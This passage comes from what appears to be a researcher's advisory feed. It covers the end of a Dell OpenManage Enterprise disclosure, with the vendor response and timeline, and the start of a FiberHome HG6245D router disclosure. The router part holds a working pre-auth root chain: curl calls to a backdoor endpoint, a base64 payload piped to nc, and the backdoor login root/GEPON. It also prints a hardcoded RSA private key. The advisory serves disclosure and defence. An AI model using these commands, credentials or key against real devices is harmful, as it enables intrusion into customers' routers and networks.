org.springframework.http.converter.HttpMessageNotReadableException: JSON parse error: Cannot deserialize value of type `java.lang.Integer` from String "a": not a valid Integer value; nested exception is com.fasterxml.jackson.databind.exc.InvalidFormatException: Cannot deserialize value of type `java.lang.Integer` from String "a": not a valid Integer value
 at [Source: (PushbackInputStream); line: 1, column: 13] (through reference chain: com.dell.enterprise.model.omc.RemoteCommandTask["targets"]-&gt;java.util.ArrayList[0])
 [100s of lines]
</code></pre>
<p>So it appears this input is deserialized before the authentication process is done.</p>
<p>We saw this behavior - deserialization or checking of validity of JSON using jackson without authentication -
in several web forms present in the solution, accepting JSON or XML, mainly before any authentication.</p>
<p>After some tests, we found 1 form that apparently checks the authentication,
but it is still possible to generate deserialization errors (post-auth):</p>
<pre><code>POST /core/api/Console/oidc/checkRegistration HTTP/1.1
Host: 192.168.1.100
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:78.0) Gecko/20100101 Firefox/78.0
Accept: application/json, text/plain, */*
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Content-Type: application/json;charset=utf-8
X-Requested-With: managementConsole
Content-Length: 24
Origin: https://192.168.1.100
Connection: close
Referer: https://192.168.1.100/core/console/console.html
Cookie: X-Auth-Token=f544973e-4c0e-4522-9b8a-a65498ebccfc

{"oidcServerIds":[a1]}
</code></pre>
<p>From <code>/var/log/dell/mcsi/tomcat/application.log</code>:</p>
<pre><code>[ERROR] 2021-05-16 13:12:15.356 [ajp-bio-8009-exec-4] BaseController - org.springframework.http.converter.HttpMessageNotReadableException: JSON parse error: Unrecognized token 'a1': was expecting (JSON String, Number, Array, Object or token 'null', 'true' or 'false'); nested exception is com.fasterxml.jackson.databind.JsonMappingException: Unrecognized token 'a1': was expecting (JSON String, Number, Array, Object or token 'null', 'true' or 'false')
 at [Source: (PushbackInputStream); line: 1, column: 24] (through reference chain: com.dell.enterprise.model.ui.OIDCRegistrationStatusList["oidcServerIds"])
org.springframework.http.converter.HttpMessageNotReadableException: JSON parse error: Unrecognized token 'a1': was expecting (JSON String, Number, Array, Object or token 'null', 'true' or 'false'); nested exception is com.fasterxml.jackson.databind.JsonMappingException: Unrecognized token 'a1': was expecting (JSON String, Number, Array, Object or token 'null', 'true' or 'false')
[...]
 at Caused by: com.fasterxml.jackson.databind.JsonMappingException: Unrecognized token 'a1': was expecting (JSON String, Number, Array, Object or token 'null', 'true' or 'false')
[...]
    at com.fasterxml.jackson.databind.deser.BeanDeserializerBase.wrapAndThrow(BeanDeserializerBase.java:1714) ~[jackson-databind-2.10.3.jar:2.10.3]
    at com.fasterxml.jackson.databind.deser.BeanDeserializer.deserializeFromObject(BeanDeserializer.java:371) ~[jackson-databind-2.10.3.jar:2.10.3]
    at com.fasterxml.jackson.databind.deser.BeanDeserializer.deserialize(BeanDeserializer.java:159) ~[jackson-databind-2.10.3.jar:2.10.3]
    at com.fasterxml.jackson.databind.ObjectMapper._readMapAndClose(ObjectMapper.java:4218) ~[jackson-databind-2.10.3.jar:2.10.3]
    at com.fasterxml.jackson.databind.ObjectMapper.readValue(ObjectMapper.java:3267) ~[jackson-databind-2.10.3.jar:2.10.3]
  [...]
    at com.fasterxml.jackson.databind.deser.std.CollectionDeserializer.deserialize(CollectionDeserializer.java:277) ~[jackson-databind-2.10.3.jar:2.10.3]
    at com.fasterxml.jackson.databind.deser.std.CollectionDeserializer.deserialize(CollectionDeserializer.java:245) ~[jackson-databind-2.10.3.jar:2.10.3]
    at com.fasterxml.jackson.databind.deser.std.CollectionDeserializer.deserialize(CollectionDeserializer.java:27) ~[jackson-databind-2.10.3.jar:2.10.3]
    at com.fasterxml.jackson.databind.deser.impl.FieldProperty.deserializeAndSet(FieldProperty.java:138) ~[jackson-databind-2.10.3.jar:2.10.3]
    at com.fasterxml.jackson.databind.deser.BeanDeserializer.deserializeFromObject(BeanDeserializer.java:369) ~[jackson-databind-2.10.3.jar:2.10.3]
    at com.fasterxml.jackson.databind.deser.BeanDeserializer.deserialize(BeanDeserializer.java:159) ~[jackson-databind-2.10.3.jar:2.10.3]
    at com.fasterxml.jackson.databind.ObjectMapper._readMapAndClose(ObjectMapper.java:4218) ~[jackson-databind-2.10.3.jar:2.10.3]
    at com.fasterxml.jackson.databind.ObjectMapper.readValue(ObjectMapper.java:3267) ~[jackson-databind-2.10.3.jar:2.10.3]
    at org.springframework.http.converter.json.AbstractJackson2HttpMessageConverter.readJavaType(AbstractJackson2HttpMessageConverter.java:237) ~[spring-web-4.3.28.RELEASE.jar:4.3.28.RELEASE]
  [...]
</code></pre>
<p>Due to the lack of interesting java gadgets, we didn't manage to exploit these deserialization errors.</p>
<p>These pre-auth and post-auth Java deserializations have been silently patched in version 3.6.1.</p>
<p><a id="idrac-user"></a></p>
<h2>Details - Idrac User</h2>
<p>When installing the appliance, an idrac user will be created with a random password:</p>
<pre><code>[root@openmanage-enterprise /]# cat /etc/shadow
[...]
idrac:$6$QtG/5PHz$1ZW7aSUeLJ6mlQM/sO/g7RLxKNUQrTwksmkJH9/meYkPTlgSvXLrR6CUikYzDg27bvprfm.EgimjX1e3yaxzC1:18763:0:99999:7:::
[root@openmanage-enterprise /]# cat /etc/passwd
[...]
idrac:x:1008:1016::/shared/dell/omc/cifs/idrac:/bin/false
</code></pre>
<p>This user may be for samba sharing functionality - we didn't success to use this functionality
from the management interface - maybe it will be possible to configure it in the next versions.</p>
<p>Interesting files are:</p>
<ul>
<li>/etc/samba/smb.conf</li>
<li>/var/lib/samba/private/passdb.tdb</li>
<li>/var/lib/samba/private/secrets.tdb</li>
</ul>
<p>It is possible to extract configurations with <code>tdbtool</code>:
<code>tdbtool /var/lib/samba/private/secrets.tdb dump</code> and <code>tdbtool /var/lib/samba/private/passdb.tdb dump</code></p>
<h2>Researcher comments on Vendor Response</h2>
<p>1 point has been considered as a vulnerability by the vendor
("Remote Auth Bypass with 2 pre-auth RCEs in docker instances") because
the attacker is not supposed to get a shell (e.g. with a command injection
or java deserialization) or to access postgres running on the appliance
(via a shell or via the network).</p>
<p>Interestingly, Dell confirmed this vulnerability that is in fact a chain 
of multiple "no-impact" vulnerabilities (lack of authentication for postgres,
command execution in redis and in postgres, R/W access to the postgres).</p>
<p>Other issues have not been considered having security impacts.
Dell confirmed postgres does not use authentication and there is no security impact in a normal situation.</p>
<p>Futhermore, this solution has an history of command injections -
nonetheless the threat model doesn't appear to include command injections
("No shell access or other ingress points available for use.").</p>
<p>2 vulnerabilities have been silently patched by the vendor, one DSA will be published (java deserialization).</p>
<h2>Vendor Response</h2>
<p>The vendor provided an impact assessment and explanations, as shown below:</p>
<ol>
<li>
<p><a href="#hardcoded-activemq-credentials">Hardcoded ActiveMQ Credentials</a> -&gt; <code>No impact</code></p>
<p>ActiveMQ credentials are not used in the appliance. File artifacts will be removed in a future release and are unused in Dell EMC OpenManage Enterprise (OME) and Dell EMC OpenManage Enterpise-Modular (OME-M).</p>
<p>Also, note that the ActiveMQ web console is disabled within OME.  In addition, as confirmed by the researcher, the firewall blocks incoming access to the relevant ports (46403 / 61616) and SELinux policies prevent users from reading these files.</p>
</li>
<li>
<p><a href="#hardcoded-activemq-credentials-for-jmx">Harcdoded ActiveMQ credentials for JMX</a> -&gt; <code>No impact</code></p>
<p>ActiveMQ JMX configuration is disabled. File artifacts will be removed in a future release and are unused in OME and OME-M. SELinux policies prevent regular users from reading the contents of these files.</p>
</li>
<li>
<p><a href="#hardcoded-activemq-keystore">Hardcoded ActiveMQ Keystore + password for keystore file (in jetty.xml)</a>  -&gt; <code>No impact</code></p>
<p>ActiveMQ keystore is not used in OME/OME-M. These artifacts will be removed in a future release.</p>
<p>SELinux policies prevent regular user read access.</p>
</li>
<li>
<p><a href="#hardcoded-jdbc-passwords">Hardcoded JDBC passwords</a> -&gt; <code>No impact</code></p>
<p>DB configured to allow access only from localhost. Also, the passwords indicated by the researcher are not used in OME / OME-M. In addition, (in OME 3.5 and later) SELinux policies add another layer of read access protection to the files with these passwords.</p>
</li>
<li>
<p><a href="#hardcoded-passwords-core_admin-replicator">Hardcoded passwords for core_admin and replicator</a> -&gt; <code>No impact</code></p>
<p>DB is configured to only allow access from localhost. The passwords indicated are not used in OME or OME-M and will be removed in a future release.</p>
</li>
<li>
<p><a href="#keystore-hardcoded-key">KeyStore using hardcoded Key</a> -&gt; <code>No impact</code></p>
<p>SELinux policies and current mitigation in place prevent file system access.</p>
</li>
<li>
<p><a href="#permissive-acl-postgres">Permissive ACL for Postgres</a> -&gt; <code>No impact</code></p>
<p>The attack vectors of shell access / ingress via Docker are not available to users - Docker path shut off in original design of product.</p>
</li>
<li>
<p><a href="#lpe-postgres">Local Privilege Escalation (as postgres) inside postgres docker</a> -&gt; <code>No impact</code></p>
<p>The attack vectors of shell access / ingress via Docker are not available to users - Docker path shut off in original design of product.</p>
</li>
<li>
<p><a href="#remote-auth-bypass-with-2-pre-auth-rces-docker-instances">Remote Auth Bypass with 2 pre-auth RCEs in docker instances</a> -&gt; <code>Impact</code></p>
<p>Remediation available in OME version 3.6.2 and OME-M 1.30.10, more information in Dell Security Advisory - DSA-2021-113 (<a href="https://www.dell.com/support/kbdoc/000189673">https://www.dell.com/support/kbdoc/000189673</a>)</p>
</li>
<li>
<p><a href="#undocumented-system-account">Undocumented <code>system</code> account</a> -&gt; <code>No impact</code></p>
<p>User cannot log in to account.</p>
</li>
<li>
<p><a href="#database-key-stored-db">Database key stored in the database</a> -&gt; <code>No impact</code></p>
<p>Postgres is configured to allow access from internal appliance services - no security impact</p>
</li>
<li>
<p><a href="#weak-permission-tls-key">Weak permission on SSL/TLS Key</a> -&gt; <code>No impact</code></p>
<p>No shell access for use in exploitation.</p>
<p>As an additional layer of defense, SELinux policies will be reviewed and updated in future releases.</p>
</li>
<li>
<p><a href="#lpe-mcsimetricssvc">Multiple Local Privilege Escalations from <code>mcsimetricssvc</code> - partially silently patched in version 3.6.1</a> -&gt; <code>No impact</code></p>
<p>No shell access or other ingress points available for use.</p>
</li>
<li>
<p><a href="#lpe-mcsitasksvc">Multiple Local Privilege Escalations from group <code>mcsitasksvc</code></a> -&gt; <code>No impact</code></p>
<p>No shell access or other ingress points available for use.</p>
</li>
<li>
<p><a href="#lpe-tomcat">Multiple Local Privilege Escalations from group <code>tomcat</code></a> -&gt; <code>No impact</code></p>
<p>No shell access or other ingress points available for use.</p>
</li>
<li>
<p><a href="#lpe-omctui">Local Privilege Escalation from group <code>omctui</code></a> -&gt; <code>No impact</code></p>
<p>No shell access or other ingress points available for use.</p>
</li>
<li>
<p><a href="#toctou-security_tool.sh">Multiple TOCTOUs in "security_tool.sh" shell script</a> -&gt; <code>No impact</code></p>
<p>Mitigation in place to block shell access by default.</p>
</li>
<li>
<p><a href="#tomcat-shadow-access">Incorrect access for tomcat</a> -&gt; <code>No impact</code></p>
<p>Debug level script is not used in OME/OME-M and will be removed in future releases.</p>
</li>
<li>
<p><a href="#grub-password-db-no-auth">Grub password stored in postgres, without authentication for local user</a> -&gt; <code>No impact</code></p>
<p>Access to postgres for password is only available to users who already have hypervisor admin privileges.</p>
</li>
<li>
<p><a href="#pre-auth-post-auth-java-deserializations">Pre-auth and post-auth Java Deserializations - silently patched in version 3.6.1</a> -&gt; <code>No impact</code></p>
<p>Found in prior internal security audit - issue mitigated in version 3.6.1, more information in Dell Security Advisory - DSA-2021-113 (<a href="https://www.dell.com/support/kbdoc/000189673">https://www.dell.com/support/kbdoc/000189673</a>).</p>
</li>
<li>
<p><a href="#idrac-user">Idrac User</a> -&gt; <code>No impact</code></p>
<p>These are credentials to access an internal CIFS share / not a user that can log in to OME. The passwords are rotated on a time interval (not configurable) and handed out by OME to clients who in turn need access to the internal CIFS share. Binary content that can be introduced on this share is limited to DUPS which are signed / signature verified by the iDRAC and other entities prior to flashing. Non-binary content is the SCP profile that is used to configure systems. The ability to invoke operations that would access the CIFS share / use content on it is relegated to authenticated high privileged OME users (admin / Device Manager roles)</p>
</li>
</ol>
<h2>Report Timeline</h2>
<ul>
<li>July, 2020: Vulnerabilities found and this advisory was written. Research took =~ 4 days.</li>
<li>May 14, 2021: Found an interesting tweet about dbutil_2_3.sys</li>
<li>May 16, 2021: Verification on version 3.5. New vulnerabilities found, advisory was rewritten.</li>
<li>June 26, 2021: Verification on version 3.6.1.</li>
<li>June 26, 2021: Advisory sent to Dell</li>
<li>June 28, 2021: Dell attributes PSRC-15668</li>
<li>Jul 14, 2021: Dell replies it is doing final reviews of their advisory and ask to coordinate disclosure to July 19</li>
<li>Jul 16, 2021: Pierre replies confirms July 19 and asks Dell to confirm the "Vendor Response" text</li>
<li>Jul 19, 2021: A public advisory is sent to security mailing lists</li>
<li>Jul 19, 2021: Dell provides CVE-2021-21596</li>
</ul>
<h2>Credits</h2>
<p>These vulnerabilities were found by Pierre Kim (<a href="https://twitter.com/PierreKimSec">@PierreKimSec</a>) and Alexandre Torres (<a href="https://twitter.com/AlexTorSec">@AlexTorSec</a>).</p>
<h2>References</h2>
<p><a href="https://pierrekim.github.io/advisories/2021-dell-openmanage-enterprise-0x00.txt">https://pierrekim.github.io/advisories/2021-dell-openmanage-enterprise-0x00.txt</a></p>
<p><a href="https://pierrekim.github.io/blog/2021-07-19-dell-openmanage-enterprise-0day-vulnerabilities.html">https://pierrekim.github.io/blog/2021-07-19-dell-openmanage-enterprise-0day-vulnerabilities.html</a></p>
<h2>Disclaimer</h2>
<p>This advisory is licensed under a Creative Commons Attribution Non-Commercial
Share-Alike 3.0 License: <a href="http://creativecommons.org/licenses/by-nc-sa/3.0/">http://creativecommons.org/licenses/by-nc-sa/3.0/</a></p></content>
    </entry>
    
    <entry>
        <title>Multiple vulnerabilities found in FiberHome HG6245D routers</title>
        <link href="2021-01-12-fiberhome-ont-0day-vulnerabilities.html"/>
        <content type="html"><h2>Product Description</h2>
<p>FiberHome Technologies is a leading equipment vendor and global solution provider in the field of information technology and telecommunications.</p>
<p>The FiberHome HG6245D routers are GPON FTTH routers. They are mainly used in South America and 
in Southeast Asia (from Shodan). These devices come with competitive pricing but are very powerful, with a lot of memory and storage.</p>
<p>I validated the vulnerabilities against HG6245D, RP2602:</p>
<pre><code>Config# show version
show version
Hardware version : WKE2.094.277A01
Software version : RP2602
Minor version : 00.00
Basic part version : RP2602
Generate time : Apr  1 2019 19:38:05
</code></pre>
<p><strong>UPDATE Feb 7, 2021 - the latest firmware version (RP2613) is also vulnerable. The vulnerabilities have been confirmed in the latest firmware image (RP2613).</strong></p>
<p>Some vulnerabilities have been tested successfully against another fiberhome device (AN5506-04-FA, firmware RP2631, 4 April 2019). The fiberhome devices have quite a similar codebase, so it is likely all other fiberhome devices (AN5506-04-FA, AN5506-04-FAT, AN5506-04-F) are also vulnerable.</p>
<p>On the first analysis, attack surface is not huge:</p>
<ul>
<li>only HTTP/HTTPS is listening by default on the LAN</li>
<li>It is also possible to enable a CLI telnetd (not reachable by default) on port 23/tcp by using hardcoded credentials on the web admin interface (<code>https://target/fh</code>).</li>
</ul>
<p>Futhermore, due to the lack of firewall for IPv6 connectivity, all the internal services will be reachable over IPv6 (from the Internet).</p>
<p>It is in fact trivial to achieve pre-auth RCE as root against the device, from the WAN (using IPv6) and from the LAN (IPv4 or IPv6).</p>
<p>This scenario involves reaching the webserver to:</p>
<ol>
<li>enable a proprietary CLI telnetd (using backdoor credentials for HTTP or using the backdoor <code>/telnet</code> HTTP API or using a stack overflow in the HTTP server in previous fiberhome routers [and skipping next steps])</li>
<li>enable the Linux telnetd using authentication bypass or with backdoor credentials</li>
<li>use backdoor credentials to get a root shell on the Linux telnetd</li>
</ol>
<p>Example of such scenario in 4 steps from a different network:</p>
<pre><code>$ curl -k https://target/info.asp # pre-auth infoleak, extract the WAN MAC, very similar to the br0 MAC,
                                  # used to enable the next backdoor. On the same network segment,
                                  # use `arp -na`
$ curl -k 'https://target/telnet?enable=1&amp;key=ENDING_PART_MAC_ADDR'  # backdoor access to authorize access
                                                                     # to CLI telnet on port 23/tcp
$ echo GgpoZWxwCmxpc3QKd2hvCmRkZAp0c2hlbGwK | base64 -d | nc target 23 &gt;/dev/null &amp; # auth bypass + start of
                                                                                    # Linux telnetd on port
                                                                                    # 26/tcp
$ telnet target 26                # backdoor root access with root / GEPON
(none) login: root
Password: [GEPON]
BusyBox v1.27.2 (2019-04-01 19:16:06 CST) built-in shell (ash)
#id
uid=0(root) gid=0 groups=0 # game over
</code></pre>
<p>Please note this research was done in the beginning of 2020 and a new firmware image may be available and may patch some vulnerabilities (even if I highly doubt it). This research was supposed to be presented during a private security event last year which was postponed due to the COVID-19 situation.</p>
<p>Full-disclosure is applied as it is believed that some backdoors have been intentionally placed by the vendor.</p>
<p>Also, it is public knowledge from 2019 that Fiberhome devices have weak passwords and RCE vulnerabilities. This quote is from 2019:</p>
<blockquote>
<p>We didn't see how Gwmndy malware spread, but we know that some Fiberhome router Web systems have weak passwords and there are RCE vulnerabilities.</p>
<p>-- <a href="https://blog.netlab.360.com/some-fiberhome-routers-are-being-utilized-as-ssh-tunneling-proxy-nodes-2/">https://blog.netlab.360.com/some-fiberhome-routers-are-being-utilized-as-ssh-tunneling-proxy-nodes-2/</a></p>
</blockquote>
<h2>Vulnerabilities Summary</h2>
<p>The summary of the vulnerabilities is:</p>
<ol>
<li><a href="#insecure-ipv6">Insecure IPv6 connectivity - CVE-2021-27170</a></li>
<li><a href="#httpd-passwords-logs">HTTP Server - Passwords in HTTP logs - CVE-2021-27140</a></li>
<li><a href="#httpd-ssl-certificates">HTTP Server - Harcoded SSL certificates- CVE-2021-27142</a></li>
<li><a href="#httpd-infoleak">HTTP server - Pre-auth InfoLeak - CVE-2021-27139</a></li>
<li><a href="#httpd-backdoor-telnet">HTTP Server - Backdoor allowing telnet access - CVE-2021-27173</a></li>
<li><a href="#httpd-hardcoded-credentials">HTTP Server - Hardcoded credentials - CVE-2021-27143 - CVE-2021-27144 - CVE-2021-27145 - CVE-2021-27146 - CVE-2021-27147 - CVE-2021-27148 - CVE-2021-27149 - CVE-2021-27150 - CVE-2021-27151 - CVE-2021-27152 - CVE-2021-27153 - CVE-2021-27154 - CVE-2021-27155 - CVE-2021-27156 - CVE-2021-27157 - CVE-2021-27158 - CVE-2021-27159 - CVE-2021-27160 - CVE-2021-27161 - CVE-2021-27162 - CVE-2021-27163 - CVE-2021-27164</a></li>
<li><a href="#httpd-tr09-hardcoded-credentials">HTTP Server - TR-069 hardcoded credentials</a></li>
<li><a href="#httpd-decryption-algorithm">HTTP Server - Credentials decryption algorithm - CVE-2021-27141</a></li>
<li><a href="#telnet-linux-hardcoded-credentials">Telnet server (Linux) - Hardcoded credentials - CVE-2021-27172</a></li>
<li><a href="#telnet-cli-hardcoded-credentials">Telnet server (CLI) - Hardcoded credentials - CVE-2021-27165 - CVE-2021-27166 - CVE-2021-27167 - CVE-2021-27168 - CVE-2021-27169</a></li>
<li><a href="#telnet-cli-privilege-escalation">Telnet server (CLI) - Privilege escalation - CVE-2021-27171</a></li>
<li><a href="#telnet-cli-auth-bypass">Telnet server (CLI) - Authentication bypass - CVE-2021-27177</a></li>
<li><a href="#telnet-cli-auth-bypass-linux-telnetd">Telnet server (CLI) - Authentication bypass to start the Linux telnetd</a></li>
<li><a href="#telnet-cli-dos">Telnet server (CLI) - DoS - CVE-2021-27179</a></li>
<li><a href="#system-credentials-clear-text-files">System - Credentials stored in clear-text - CVE-2021-27174 - CVE-2021-27175 - CVE-2021-27176</a></li>
<li><a href="#system-credentials-clear-text-nvram">System - Passwords stored in clear-text in nvram - CVE-2021-27178</a></li>
<li><a href="#misc-remote-stack-overflow-an5506">Misc - Remote stack overflow in the HTTP server (AN5506-04-FA / RP2631)</a></li>
</ol>
<p>I removed several DoS and strange technical details (linked to undisclosed vulnerabilities) for clarity.</p>
<p><a id="insecure-ipv6"></a></p>
<h2>Details - Insecure IPv6 connectivity</h2>
<p>By default, there are no firewall rules for the IPv6 connectivity, exposing the internal management interfaces from the Internet.</p>
<p>An attacker can get a full access to the management http server (using hardcoded passwords) and the telnet services, by reaching the IPv6s assigned to the wan0 and the br0 interfaces.</p>
<p>On the device:</p>
<pre><code>#ifconfig wan0
wan0      Link encap:Ethernet  HWaddr [REMOVED]
          [...]
          inet6 addr: [REMOVED]/64 Scope:Global
          [...]
          UP BROADCAST RUNNING MULTICAST  MTU:1500  Metric:1

#ifconfig br0
br0       Link encap:Ethernet  HWaddr [REMOVED]
          inet addr:192.168.1.1  Bcast:192.168.1.255  Mask:255.255.255.0
          inet6 addr: [REMOVED]/64 Scope:Global
          [...]
          UP BROADCAST RUNNING MULTICAST  MTU:1500  Metric:1
</code></pre>
<p><code>br0</code> is the internal network interface assigned to the LAN.
All the services are binding to both <code>br0</code> and <code>wan0</code>.</p>
<p>It is trivial to reach services from the WAN (Internet), by contacting IPv6 used by <code>br0</code> or <code>wan0</code>:</p>
<p>From the WAN:</p>
<pre><code>rasp-wan-olt% telnet [ipv6] 26
Trying [ipv6]...
Connected to [ipv6].
Escape character is '^]'.

(none) login: 
telnet&gt; q
Connection closed.

rasp-wan-olt% telnet [ipv6] 80
Trying [ipv6]...
Connected to [ipv6].
Escape character is '^]'.
GET / HTTP/1.0

HTTP/1.0 302 Redirect
Server: GoAhead-Webs/2.5.0 PeerSec-MatrixSSL/3.4.2-OPEN
Date: Mon Jan  7 21:01:29 2020
Pragma: no-cache
Cache-Control: no-cache
Content-Type: text/html
X-Frame-Options: SAMEORIGIN
Location: https://

&lt;html&gt;&lt;head&gt;&lt;/head&gt;&lt;body&gt;
                This document has moved to a new &lt;a href="https://"&gt;location&lt;/a&gt;.
                Please update your documents to reflect the new location.
                &lt;/body&gt;&lt;/html&gt;

Connection closed by foreign host.
rasp-wan-olt%
</code></pre>
<p>By using <code>ip6tables</code> on the device, we can confirm the complete lack of firewall rules for IPv6 connectivity:</p>
<pre><code>#ip6tables -nL
Chain INPUT (policy ACCEPT)
target     prot opt source               destination

Chain FORWARD (policy ACCEPT)
target     prot opt source               destination         
forward_ext_ip  all      ::/0                 ::/0                
forward_ext_url  all      ::/0                 ::/0                
forward_ext_mac  all      ::/0                 ::/0

Chain OUTPUT (policy ACCEPT)
target     prot opt source               destination

Chain forward_ext_ds_ip (1 references)
target     prot opt source               destination

Chain forward_ext_ip (1 references)
target     prot opt source               destination         
forward_ext_us_ip  all      ::/0                 ::/0                
forward_ext_ds_ip  all      ::/0                 ::/0

Chain forward_ext_mac (1 references)
target     prot opt source               destination

Chain forward_ext_url (1 references)
target     prot opt source               destination

Chain forward_ext_us_ip (1 references)
target     prot opt source               destination         
#
</code></pre>
<p>I highly recommend disabling IPv6 connectivity.</p>
<p><a id="httpd-passwords-logs"></a></p>
<h2>Details - HTTP Server - Passwords in HTTP logs</h2>
<p>It is possible to find passwords and authentication cookies stored in clear-text in HTTP logs:</p>
<pre><code>#cat /fhconf/web_log/web.log
web_utils&gt;2020-01-07 19:16:26,../utils/cu_sessionManagement.c[465](findUser): no user named admin !
&lt;web_custom&gt;2020-01-07 19:16:27,../custom/weblogin.c[595](webLogin): *************userGroupName = 1
&lt;web_init&gt;2020-01-07 19:16:27,../utils/utils.c[1399](get_admin_default_info): enter get_admin_default_info
&lt;web_custom&gt;2020-01-07 19:16:27,../custom/weblogin.c[812](webLogin): Warning! Password error! password = [REMOVED]
&lt;web_utils&gt;2020-01-07 19:27:24,../utils/cu_sessionManagement.c[238](createSession): create user [REMOVED]
</code></pre>
<p><a id="httpd-ssl-certificates"></a></p>
<h2>Details - HTTP Server - Harcoded SSL certificates</h2>
<p>The web management is done over HTTPS, using a hardcoded private key with 777 permissions:</p>
<pre><code>#ls -la /fhrom/bin/web/certSrv.pem /fhrom/bin/web/privkeySrv.pem
-rwxrwxrwx    1 root     0              883 Apr  1  2019 /fhrom/bin/web/certSrv.pem
-rwxrwxrwx    1 root     0              887 Apr  1  2019 /fhrom/bin/web/privkeySrv.pem
#cat /fhrom/bin/web/privkeySrv.pem
-----BEGIN RSA PRIVATE KEY-----
MIICWwIBAAKBgQCY22+N/5InUhmotgU8jh9nQdyTmKYwFJKpvMek9fJK8rCsrED7
yl+mvUPv3yqLyMgvu1AcMmYEyngpbw94rnd2k91wiRGUGUSq8mTRPFwnplTPI8hI
JglMsKcskzRP951jxsiSS1eMlLcEd9iMUcpjUbgWzxKH0fFlRD5d8jYPtwIDAQAB
AoGANEjy6n5d7sc9caD5P5JZmYdEvNO9HLscw6SIIZvjCdHjrtyoybeaaj1ZDKao
NfIyz2jh6RMwJDlhSsLrZts+jzB+k7fAqUkdLi6fkZmpamL1OEHMqzWdWuVFgCjd
uf8ZMMuQ+/3gx/tjjG0sBuL/ko1Q7oxoIty+4xm9cwqGGtkCQQDKIJYYp9385gk4
8qDcdgnc39kmsheUB5VS0pU1/pxL2YIJltq79yghwQisaNsUUk4LMW6hNyPx7Knx
jRpHLsgTAkEAwZkVbjo3Ll+fM+1oPPcY4i960DURrR9eMVhq771n+GzCs9gEy2Ea
HW5f0yamZBMURZWECu1W0s764QkHXwzWTQJAaYGi95HAVT86NyinAQz4TvvlnMY/
enyO3GGhk0KpEQqjTyAYYx87KotZXK2LFct0g3E1Hx/qOmDfwH935QotUwJAH4mE
iDRLkO5azOa7uFK4ZwA9DXXXr1AQ1BEHOo6sRTfSb+GcxlTHIEw+p/L/4AWLo9o7
bFxFbInzLH2ACefZcQJAJ+US+g9Dp4tiLrenketRv9+3nOPGod2WOGqjMaEqOgmC
RjGu2aI9YguR3FuX3W9KOOg3EDn/l/O1XynBPRO9Aw==
-----END RSA PRIVATE KEY-----
#cat /fhrom/bin/web/certSrv.pem
-----BEGIN CERTIFICATE-----
MIICXzCCAcgCCQCqr5AgCgFdqzANBgkqhkiG9w0BAQUFADB0MQswCQYDVQQGEwJD
SDELMAkGA1UECBMCSFUxCzAJBgNVBAcTAldVMQswCQYDVQQKEwJGSDELMAkGA1UE
CxMCU0YxDDAKBgNVBAMTA1BPTjEjMCEGCSqGSIb3DQEJARYUUE9OQEZJQkVSSE9N
RS5DT00uQ04wHhcNMTMwNDI0MDEyMTUwWhcNMjMwNDIyMDEyMTUwWjB0MQswCQYD
VQQGEwJDSDELMAkGA1UECBMCSFUxCzAJBgNVBAcTAldVMQswCQYDVQQKEwJGSDEL
MAkGA1UECxMCU0YxDDAKBgNVBAMTA1BPTjEjMCEGCSqGSIb3DQEJARYUUE9OQEZJ
QkVSSE9NRS5DT00uQ04wgZ8wDQYJKoZIhvcNAQEBBQADgY0AMIGJAoGBAJjbb43/
kidSGai2BTyOH2dB3JOYpjAUkqm8x6T18krysKysQPvKX6a9Q+/fKovIyC+7UBwy
ZgTKeClvD3iud3aT3XCJEZQZRKryZNE8XCemVM8jyEgmCUywpyyTNE/3nWPGyJJL
V4yUtwR32IxRymNRuBbPEofR8WVEPl3yNg+3AgMBAAEwDQYJKoZIhvcNAQEFBQAD
gYEACZJepEU36h3PMc0O15Bo7zkBWm2dD0RbTrJeZF561VcxlpuE2GDirNCXAbZz
Ue/x+fDQBEM8kqpFYcVMPzZBUdFwu1QIY0DottXVcFFNoKS54GL9LEMaS6l6R/D5
G8bCy/RF3kZwzE2cflZ7x78zdpQpzzDcOD415ek5zkadhu0=
-----END CERTIFICATE-----
#
</code></pre>
<p>Another hardcoded private key is also available (?!) in <code>/fhrom/bin/web</code> and can be downloaded over HTTPS:</p>
<pre><code>#ls -la /fhrom/bin/web/privkeySrv.pem
-rwxrwxrwx    1 root     0              887 Apr  1  2019 /fhrom/bin/web/privkeySrv.pem

$ curl -k https://192.168.1.1/privkeySrv.pem
-----BEGIN RSA PRIVATE KEY-----
MIICWwIBAAKBgQCY22+N/5InUhmotgU8jh9nQdyTmKYwFJKpvMek9fJK8rCsrED7
yl+mvUPv3yqLyMgvu1AcMmYEyngpbw94rnd2k91wiRGUGUSq8mTRPFwnplTPI8hI
JglMsKcskzRP951jxsiSS1eMlLcEd9iMUcpjUbgWzxKH0fFlRD5d8jYPtwIDAQAB
AoGANEjy6n5d7sc9caD5P5JZmYdEvNO9HLscw6SIIZvjCdHjrtyoybeaaj1ZDKao
NfIyz2jh6RMwJDlhSsLrZts+jzB+k7fAqUkdLi6fkZmpamL1OEHMqzWdWuVFgCjd
uf8ZMMuQ+/3gx/tjjG0sBuL/ko1Q7oxoIty+4xm9cwqGGtkCQQDKIJYYp9385gk4
8qDcdgnc39kmsheUB5VS0pU1/pxL2YIJltq79yghwQisaNsUUk4LMW6hNyPx7Knx
jRpHLsgTAkEAwZkVbjo3Ll+fM+1oPPcY4i960DURrR9eMVhq771n+GzCs9gEy2Ea
HW5f0yamZBMURZWECu1W0s764QkHXwzWTQJAaYGi95HAVT86NyinAQz4TvvlnMY/
enyO3GGhk0KpEQqjTyAYYx87KotZXK2LFct0g3E1Hx/qOmDfwH935QotUwJAH4mE
iDRLkO5azOa7uFK4ZwA9DXXXr1AQ1BEHOo6sRTfSb+GcxlTHIEw+p/L/4AWLo9o7
bFxFbInzLH2ACefZcQJAJ+US+g9Dp4tiLrenketRv9+3nOPGod2WOGqjMaEqOgmC
RjGu2aI9YguR3FuX3W9KOOg3EDn/l/O1XynBPRO9Aw==
-----END RSA PRIVATE KEY-----
</code></pre>
<p><a id="httpd-infoleak"></a></p>
<h2>Details - HTTP server - Pre-auth InfoLeak</h2>
<p>It is possible to extract information from the device without authentication by disabling Javascript and visiting <code>/info.asp</code>:</p>
<pre><code>$ curl -k https://192.168.1.1/info.asp
[..]

Software Version: [REMOVED]
[...]
ONU State: [REMOVED]
Regist State: [REMOVED]
LOID: [REMOVED] &lt;----------- Secret used for FTTH connection
[...]
IP Address: [REMOVED]
Subnet Mask: [REMOVED]
IPv6 Address: [REMOVED]
DHCP Clients List: [REMOVED]
